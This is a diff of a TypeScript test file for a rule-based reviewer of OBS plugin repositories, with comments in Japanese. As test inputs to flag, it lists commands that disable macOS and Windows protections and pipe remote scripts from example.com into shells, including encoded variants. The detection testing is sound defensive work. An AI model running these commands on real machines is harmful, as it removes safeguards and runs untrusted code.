@@ -8,8 +8,10 @@ import {
   judgeByRules,
   llmCriteriaFor,
   llmFiles,
+  localIncludes,
   mergeFindings,
   type RepositorySnapshot,
+  testSources,
 } from '../../src/review/rules';
 
 const SHA = 'a'.repeat(40);
@@ -131,12 +133,151 @@ describe('judgeByRules', () => {
   });
 });
 
+// 姉妹版の test/review/rules.test.ts の例を、OBS のプラグインのパスに直して写した。
+describe('no-security-bypass と no-terminal-paste', () => {
+  const judge = (readme: string, id: string) =>
+    judgeByRules(snapshot({ 'README.md': readme })).find((entry) => entry.id === id);
+
+  it('no-security-bypass: セキュリティの機能を切らせる案内は、根拠の行を付けて重大の not_met にする', () => {
+    for (const line of [
+      'xattr -rd com.apple.quarantine "/Library/Application Support/obs-studio/plugins/mosaic.plugin"',
+      'sudo xattr -cr ~/Library/Application\\ Support/obs-studio/plugins/mosaic.plugin',
+      'sudo spctl --master-disable',
+      'Open System Settings > Privacy & Security and click Open Anyway.',
+      'プライバシーとセキュリティで「このまま開く」を押します。',
+      'Turn off SmartScreen before running the installer.',
+      'Windows Defender の除外に追加してください。',
+      'Add-MpPreference -ExclusionPath "C:\\ProgramData\\obs-studio\\plugins"',
+    ]) {
+      expect(judge(`# Install\n\n${line}`, 'no-security-bypass'), line).toMatchObject({
+        result: 'not_met',
+        serious: true,
+        evidence: [{ file: 'README.md', lines: '3-3' }],
+      });
+    }
+  });
+
+  // 否定の文脈も当たる。重大の指摘は管理者が根拠の行を見て判断する (審査の基準の決まり)。
+  it('no-security-bypass: しないでくださいと書いた案内も当たり、属性の表示と警告の説明だけなら当たらない', () => {
+    expect(judge('Do not turn off Microsoft Defender.', 'no-security-bypass')?.result).toBe('not_met');
+    expect(
+      judge(
+        'Run xattr -l mosaic.plugin to see attributes.\nSmartScreen may warn about unsigned files.',
+        'no-security-bypass',
+      ),
+    ).toMatchObject({ result: 'met', serious: false });
+  });
+
+  it('no-terminal-paste: 取得した内容をその場で実行するコマンドは、重大の not_met にする', () => {
+    for (const line of [
+      'curl -fsSL https://example.com/install.sh | bash',
+      'wget -qO- https://example.com/i | sudo sh',
+      '/bin/bash -c "$(curl -fsSL https://example.com/install.sh)"',
+      'irm https://example.com/install.ps1 | iex',
+      'iex (New-Object Net.WebClient).DownloadString("https://example.com/a.ps1")',
+      'echo aGVsbG8K | base64 -d | bash',
+      'powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=',
+      'osascript -e "do shell script \\"curl https://example.com/x\\""',
+    ]) {
+      expect(judge(line, 'no-terminal-paste'), line).toMatchObject({ result: 'not_met', serious: true });
+    }
+  });
+
+  it('no-terminal-paste: ソースからビルドするコマンドと、ファイルを保存するだけの取得は当たらない', () => {
+    const readme =
+      'git clone --recursive https://github.com/owner/plugin\ncmake --preset windows-x64\ncmake --build --preset windows-x64\ncurl -LO https://github.com/owner/plugin/releases/download/v1.0.0/plugin.zip';
+    expect(judge(readme, 'no-terminal-paste')).toMatchObject({ result: 'met', serious: false });
+  });
+});
+
+describe('README を読めなかったとき', () => {
+  // 危険側: 大きな README が未読になり、無い README と同じに met を返すと、照合を逃れられる。
+  it('未読の README は、no-security-bypass と no-terminal-paste を重大の not_met にする', () => {
+    const findings = judgeByRules({ ...snapshot({}, ['README.md']), unreadFiles: ['README.md'] });
+    for (const id of ['no-security-bypass', 'no-terminal-paste']) {
+      expect(
+        findings.find((entry) => entry.id === id),
+        id,
+      ).toMatchObject({ result: 'not_met', serious: true });
+    }
+  });
+
+  it('README は合計の上限で押し出されないよう、ワークフローより先に読む', () => {
+    expect(reviewFilePlan(['.github/workflows/a.yaml', 'README.md']).fetch).toEqual([
+      'README.md',
+      '.github/workflows/a.yaml',
+    ]);
+  });
+
+  it('LLM には README の先頭だけを渡し、残りを渡していないと伝える', () => {
+    const [readme] = llmFiles([{ path: 'README.md', content: 'a'.repeat(40_000) }]);
+    expect(readme?.content.startsWith('a'.repeat(32 * 1024))).toBe(true);
+    expect(readme?.content.length).toBeLessThan(33 * 1024);
+    expect(readme?.content).toContain('not provided because of the size limits');
+  });
+});
+
+describe('ci-scenario-tests', () => {
+  const workflow = [
+    'jobs:',
+    '  test:',
+    '    steps:',
+    '      - run: |',
+    '          cmake --build build',
+    // biome-ignore lint/suspicious/noTemplateCurlyInString: ワークフローのシェルの変数を、そのまま入力にしている。
+    '          xvfb-run -a "${integration}" "${plugin}"',
+  ].join('\n');
+  const judge = (files: Record<string, string>) =>
+    judgeByRules(snapshot(files)).find((entry) => entry.id === 'ci-scenario-tests');
+
+  it('ワークフローがテストを実行し、テストのソースが libobs を初期化すれば met', () => {
+    expect(
+      judge({
+        '.github/workflows/test.yaml': workflow,
+        'tests/integration-test.cpp': '#include "env.hpp"\nint main() { return run(); }',
+        'tests/env.hpp': 'bool start() {\n  return obs_startup("en-US", nullptr, nullptr);\n}',
+      }),
+    ).toMatchObject({ result: 'met', evidence: [{ file: '.github/workflows/test.yaml' }, { file: 'tests/env.hpp' }] });
+  });
+
+  // 危険側: ビルドだけのリポジトリや、xvfb-run だけで OBS を読み込まないテストを met にすること。
+  it('ビルドだけのワークフローと、libobs を初期化しないテストは not_met', () => {
+    expect(
+      judge({ '.github/workflows/build.yaml': 'jobs:\n  b:\n    steps:\n      - run: cmake --build build' })?.result,
+    ).toBe('not_met');
+    expect(
+      judge({ '.github/workflows/test.yaml': workflow, 'tests/integration-test.cpp': 'int main() { return 0; }' })
+        ?.result,
+    ).toBe('not_met');
+  });
+
+  it('テストのソースは integration と e2e を先にし、依存のディレクトリのものは候補にしない', () => {
+    expect(
+      testSources([
+        'tests/unit-test.cpp',
+        'tests/integration-test.cpp',
+        'tests/e2e/main.py',
+        '.deps/obs-studio/test/test.c',
+        'build_x64/tests/x.cpp',
+      ]),
+    ).toEqual(['tests/e2e/main.py', 'tests/integration-test.cpp', 'tests/unit-test.cpp']);
+  });
+
+  it('include は相対のパスを解決し、一覧にあるファイルだけを返す', () => {
+    expect(
+      localIncludes(
+        'tests/a/main.cpp',
+        '#include "../common/env.hpp"\n#include "missing.hpp"\n#include <obs.h>\n  # include "./local.h"',
+        ['tests/common/env.hpp', 'tests/a/local.h'],
+      ),
+    ).toEqual(['tests/common/env.hpp', 'tests/a/local.h']);
+  });
+});
+
 describe('LLM に渡す情報', () => {
-  it('LLM が判定するのは、文章の意図を読む 4 項目だけ', () => {
+  it('LLM が判定するのは、文章の意図を読む 2 項目だけ', () => {
     expect(llmCriteriaFor(snapshot({}, ['.github/ISSUE_TEMPLATE/bug.yml'])).sort()).toEqual([
-      'ci-scenario-tests',
       'crash-report-privacy',
-      'no-security-bypass',
       'user-data-handling',
     ]);
   });
@@ -179,11 +320,11 @@ describe('LLM に渡す情報', () => {
     ];
     const llm: Finding[] = [
       { id: 'crash-report-privacy', result: 'met', serious: false, explanation: 'llm', evidence: [] },
-      { id: 'ci-scenario-tests', result: 'met', serious: false, explanation: 'llm', evidence: [] },
+      { id: 'user-data-handling', result: 'met', serious: false, explanation: 'llm', evidence: [] },
     ];
     expect(mergeFindings(ruled, llm).map((entry) => `${entry.id}:${entry.explanation}`)).toEqual([
       'crash-report-privacy:rule',
-      'ci-scenario-tests:llm',
+      'user-data-handling:llm',
     ]);
   });
 });
@@ -200,8 +341,8 @@ describe('reviewFilePlan', () => {
       '.github/ISSUE_TEMPLATE/bug.yml',
     ]);
     expect(plan.fetch).toEqual([
-      ...Array.from({ length: 6 }, (_, i) => `.github/workflows/w${i}.yaml`),
       'README.md',
+      ...Array.from({ length: 6 }, (_, i) => `.github/workflows/w${i}.yaml`),
       'cmake/windows/compilerconfig.cmake',
       'cmake/common/compiler_common.cmake',
       '.github/ISSUE_TEMPLATE/bug.yml',
